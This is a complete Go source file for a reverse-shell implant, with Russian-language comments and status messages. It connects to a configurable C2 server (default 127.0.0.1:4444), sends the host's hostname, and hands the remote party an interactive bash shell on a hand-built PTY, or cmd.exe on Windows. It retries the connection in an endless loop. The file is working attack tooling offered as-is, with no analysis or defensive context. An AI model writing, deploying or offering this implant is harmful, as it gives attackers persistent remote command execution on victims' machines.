package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

var (
	serverAddr = flag.String("server", "127.0.0.1:4444", "адрес C2 сервера (IP:PORT)")
)

func main() {
	flag.Parse()
	for {
		conn, err := net.Dial("tcp", *serverAddr)
		if err != nil {
			fmt.Println("[!] Не удалось подключиться к C2, повтор через 10 сек:", err)
			time.Sleep(10 * time.Second)
			continue
		}
		fmt.Println("[+] Подключение к C2 установлено")
		handleConnection(conn)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func handleConnection(conn net.Conn) {
	hostname, _ := os.Hostname()
	_, err := conn.Write([]byte(hostname + "\n"))
	if err != nil {
		fmt.Println("[-] Ошибка отправки приветствия:", err)
		return
	}
	interactiveShell(conn)
}

func interactiveShell(conn net.Conn) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd")
		runWindowsShell(conn, cmd)
		return
	} else {
		cmd = exec.Command("/bin/bash")
	}

	f, err := createPTY(cmd)
	if err != nil {
		fmt.Println("[-] Ошибка создания PTY:", err)
		return
	}
	defer f.Close()

	err = cmd.Start()
	if err != nil {
		fmt.Println("[-] Ошибка запуска шелла:", err)
		return
	}

	conn.SetReadDeadline(time.Time{})

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if _, writeErr := f.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := f.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	err = cmd.Wait()
	if err != nil {
		fmt.Println("[*] Шелл завершился с ошибкой:", err)
	} else {
		fmt.Println("[*] Шелл завершился")
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}

func createPTY(cmd *exec.Cmd) (*os.File, error) {
	f, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("не удалось открыть /dev/ptmx: %v", err)
	}

	var num int
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		f.Fd(),
		syscall.TIOCGPTN,
		uintptr(unsafe.Pointer(&num)),
	)
	if errno != 0 {
		f.Close()
		return nil, fmt.Errorf("ошибка TIOCGPTN: %v", errno)
	}

	var unlock int = 0
	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		f.Fd(),
		syscall.TIOCSPTLCK,
		uintptr(unsafe.Pointer(&unlock)),
	)
	if errno != 0 {
		f.Close()
		return nil, fmt.Errorf("ошибка разблокировки PTY: %v", errno)
	}

	slaveName := fmt.Sprintf("/dev/pts/%d", num)
	slave, err := os.OpenFile(slaveName, os.O_RDWR, 0)
	if err != nil {
		f.Close()
		return nil, fmt.Errorf("не удалось открыть %s: %v", slaveName, err)
	}

	err = setTerminalSize(slave.Fd(), 24, 80)
	if err != nil {
		f.Close()
		slave.Close()
		return nil, fmt.Errorf("ошибка установки размера: %v", err)
	}

	err = setRawTerminal(slave.Fd())
	if err != nil {
		f.Close()
		slave.Close()
		return nil, fmt.Errorf("ошибка настройки терминала: %v", err)
	}

	cmd.Stdin = slave
	cmd.Stdout = slave
	cmd.Stderr = slave

	cmd.SysProcAttr = &syscall.SysProcAttr{
		Setsid:  true,
		Setctty: true,
		Ctty:    0,
	}

	return f, nil
}

func setTerminalSize(fd uintptr, rows, cols int) error {
	ws := winsize{
		Row:    uint16(rows),
		Col:    uint16(cols),
		Xpixel: 0,
		Ypixel: 0,
	}
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TIOCSWINSZ,
		uintptr(unsafe.Pointer(&ws)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TIOCSWINSZ: %v", errno)
	}
	return nil
}

func setRawTerminal(fd uintptr) error {
	var termios syscall.Termios
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCGETS,
		uintptr(unsafe.Pointer(&termios)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCGETS: %v", errno)
	}

	// Отключаем канонический режим и обработку сигналов
	termios.Lflag &^= syscall.ICANON | syscall.ISIG
	// Включаем эхо
	termios.Lflag |= syscall.ECHO

	// Отключаем только управление потоком (Ctrl+S/Ctrl+Q)
	termios.Iflag &^= syscall.IXON
	// НЕ отключаем ICRNL (преобразование \r -> \n)
	// НЕ отключаем OPOST (обработка вывода)

	// Включаем 8-битные символы
	termios.Cflag |= syscall.CS8

	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCSETS,
		uintptr(unsafe.Pointer(&termios)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCSETS: %v", errno)
	}

	return nil
}

type winsize struct {
	Row    uint16
	Col    uint16
	Xpixel uint16
	Ypixel uint16
}

func runWindowsShell(conn net.Conn, cmd *exec.Cmd) {
	stdin, err := cmd.StdinPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stdin pipe:", err)
		return
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stdout pipe:", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		fmt.Println("[-] Ошибка создания stderr pipe:", err)
		return
	}

	err = cmd.Start()
	if err != nil {
		fmt.Println("[-] Ошибка запуска шелла:", err)
		return
	}

	conn.SetReadDeadline(time.Time{})

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if _, writeErr := stdin.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stdout.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := stderr.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					return
				}
			}
			if err != nil {
				return
			}
		}
	}()

	err = cmd.Wait()
	if err != nil {
		fmt.Println("[*] Шелл завершился с ошибкой:", err)
	} else {
		fmt.Println("[*] Шелл завершился")
	}

	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}
